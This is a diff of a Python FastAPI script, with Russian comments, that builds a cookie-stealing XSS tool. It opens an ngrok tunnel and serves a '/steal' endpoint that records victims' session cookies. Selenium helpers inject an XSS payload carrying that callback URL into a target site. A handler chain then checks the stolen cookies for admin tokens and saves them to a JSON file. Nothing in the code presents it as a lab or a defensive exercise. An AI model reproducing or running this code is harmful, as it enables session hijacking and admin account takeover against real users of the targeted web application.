@@ -1,110 +1,173 @@
-from fastapi import FastAPI, HTTPException, Request
+from fastapi import FastAPI, Request
 import uvicorn
 from pyngrok import ngrok, conf
-import threading  # Для запуска uvicorn и управления завершением программы
+import threading
+import time
 
-# from exceptions import ChainException
+
 from selenium_start_point import run_capture_logic, close_driver
 from requests_to_selenium import rename, message
+from handlers import CreateChain
+from context import RequestContext
+import json
 
 app = FastAPI()
 
 NGROK_PUBLIC_URL = None
-
+server_thread = None
 stop_event = threading.Event()
+processed_tokens = set()
 
 
-def start_ngrok():
+def start_ngrok_sync():
     global NGROK_PUBLIC_URL
+    try:
+        conf.get_default().region = "us"
 
-    conf.get_default().region = "us"
+        tunnels = ngrok.get_tunnels()
+        for tunnel in tunnels:
+            ngrok.disconnect(tunnel.public_url)
+        time.sleep(1)
 
-    tunnel = ngrok.connect(8000, bind_tls=True)
-    NGROK_PUBLIC_URL = tunnel.public_url
-    print(f"Ngrok tunnel started: {NGROK_PUBLIC_URL}")
+        tunnel = ngrok.connect(8000, bind_tls=True)
+        NGROK_PUBLIC_URL = tunnel.public_url
+        print(f"Ngrok tunnel started: {NGROK_PUBLIC_URL}")
+        return NGROK_PUBLIC_URL
+    except Exception as e:
+        print(f"Error starting ngrok: {e}")
+        NGROK_PUBLIC_URL = f"Error: {e}"
+        return NGROK_PUBLIC_URL
 
 
-def shutdown_ngrok():
-    ngrok.disconnect(NGROK_PUBLIC_URL)
-    ngrok.kill()
-    print("Ngrok tunnel shutdown")
+def shutdown_ngrok_sync():
+    global NGROK_PUBLIC_URL
+    try:
+        if NGROK_PUBLIC_URL and not NGROK_PUBLIC_URL.startswith("Error"):
+            ngrok.disconnect(NGROK_PUBLIC_URL)
+        ngrok.kill()
+        print("Ngrok tunnel shutdown")
+        NGROK_PUBLIC_URL = None
+    except Exception as e:
+        print(f"Error shutting down ngrok: {e}")
 
 
-# @app.options("/steal")
-# async def options_steal():
-#     return {
-#         "Allow": "OPTIONS, GET",
-#         "Content-Length": "0",
-#         "Content-Type": "text/plain",
-#     }
+chain_creator = CreateChain()
+setup_handler = chain_creator.create_base_chain()
 
 
 @app.options("/steal")
 async def steal_cookie(request: Request):
+    global processed_tokens
     cookie = request.query_params.get("cookie", "No cookie received")
     print(f"Received stolen cookie: {cookie}")
 
-    # Создаем контекст запроса
-    from context import RequestContext
-    from config import TARGET_URL, get_base_headers
+    if cookie in processed_tokens:
+        print(f"Token already processed: {cookie}")
+        return {"message": "Token already processed"}
 
-    context = RequestContext(
-        url=TARGET_URL,
-        base_headers=get_base_headers(),
-        session_id=cookie,
-    )
-
-    # Создаем цепочку обязанностей
-    from handlers import AdminTokenHandler, UserChatHandler, LoggingHandler
+    processed_tokens.add(cookie)
+    context = RequestContext(cookie=cookie)
 
     try:
-        admin_handler = AdminTokenHandler()
-        user_chat_handler = UserChatHandler()
-        logging_handler = LoggingHandler()
 
-        # Устанавливаем последовательность цепочки
-        admin_handler.set_next(user_chat_handler).set_next(logging_handler)
+        setup_handler.handle_request(context)
 
-        # Запускаем обработку запроса через цепочку
-        admin_handler.handle_request(context)
-
-        return {
-            "message": "Request processed through Chain of Responsibility",
-            "cookie": cookie,
-        }
-
+        print(f"Processed and saved cookie: {cookie}")
+        return {"message": "Cookie processed", "cookie": cookie}
     except Exception as e:
-        return {"error": f"Unexpected error: {str(e)}"}
+        print(f"Error processing cookie {cookie}: {e}")
+
+        return {"error": f"Processing error: {str(e)}"}
 
 
-def start_server():
-    uvicorn.run(app, host="127.0.0.1", port=8000)
-
-
-if __name__ == "__main__":
+def run_fastapi_server():
     try:
-        start_ngrok()
-        print("--- Starting FastAPI server ---")
-        print("Visit http://127.0.0.1:8000/docs for API documentation")
+        uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
+    except Exception as e:
+        print(f"FastAPI server error: {e}")
 
-        # Запуск uvicorn в отдельном потоке
-        server_thread = threading.Thread(target=start_server, daemon=True)
-        server_thread.start()
 
-        # Выполнение основного скрипта
+def start_server_thread():
+    global server_thread, stop_event
+    stop_event.clear()
+    server_thread = threading.Thread(target=run_fastapi_server, daemon=True)
+    server_thread.start()
+    print("FastAPI server thread started.")
+    return server_thread
+
+
+def run_complete_logic():
+    global NGROK_PUBLIC_URL, driver
+    driver = None
+    try:
+        print("--- Starting Selenium Capture Logic ---")
         driver = run_capture_logic()
-        rename(NGROK_PUBLIC_URL + "/steal?" + "cookie=")
-        message()
+        if driver and NGROK_PUBLIC_URL and not NGROK_PUBLIC_URL.startswith("Error"):
+            callback_url = f"{NGROK_PUBLIC_URL}/steal?cookie="
+            print(f"--- Injecting XSS with callback: {callback_url} ---")
+            rename(callback_url)
+            print("--- Sending initial message ---")
+            message()
+            print(
+                "--- Selenium Logic Completed (XSS injected, initial message sent) ---"
+            )
 
-        # Ожидание завершения программы
-        print("Основной скрипт завершен. Сервер продолжает работу.")
-        stop_event.wait()  # Блокировка основного потока до установки события
+            return driver, "Selenium logic completed successfully."
+        elif not driver:
+            return None, "Failed to initialize Selenium driver."
+        else:
+            return driver, "Ngrok URL not available, cannot inject XSS."
+    except Exception as e:
+        print(f"CRITICAL ERROR during Selenium logic: {e}")
+        if driver:
+            close_driver(driver)
+        return None, f"Error in Selenium logic: {e}"
 
-    except KeyboardInterrupt:
-        print("Завершение работы по сигналу KeyboardInterrupt.")
-        print("Завершение работы по сигналу KeyboardInterrupt.")
 
-    finally:
-        shutdown_ngrok()
-        close_driver(driver)
-        stop_event.set()  # Установка события для завершения программы
+def stop_all(driver_instance):
+    global stop_event, server_thread
+    print("--- Initiating shutdown ---")
+    stop_event.set()
+
+    if driver_instance:
+        close_driver(driver_instance)
+        print("Selenium driver closed.")
+    else:
+        print("No active Selenium driver to close.")
+
+    shutdown_ngrok_sync()
+    print("Ngrok shutdown requested.")
+
+    print("FastAPI server (daemon thread) will stop on application exit.")
+
+    global processed_tokens
+    processed_tokens.clear()
+    try:
+        with open("saved_class_data.json", "w") as f:
+            json.dump([], f)
+        print("Cleared saved_class_data.json")
+    except Exception as e:
+        print(f"Could not clear saved_class_data.json: {e}")
+
+    return "Shutdown process initiated."
+
+
+def get_processed_data():
+    try:
+        with open("saved_class_data.json", "r", encoding="utf-8") as f:
+            data = json.load(f)
+            if not isinstance(data, list):
+                data = []
+
+        output = []
+        for item in data:
+            cookie_preview = item.get("cookie", "N/A")[:50] + "..."
+            is_admin = item.get("is_admin", "N/A")
+            output.append(f"Admin: {is_admin} | Cookie: {cookie_preview}")
+        return "\n".join(output) if output else "Пока нет данных."
+    except FileNotFoundError:
+        return "Файл saved_class_data.json не найден."
+    except json.JSONDecodeError:
+        return "Ошибка чтения saved_class_data.json (возможно, пустой или поврежден)."
+    except Exception as e:
+        return f"Ошибка чтения данных: {e}"
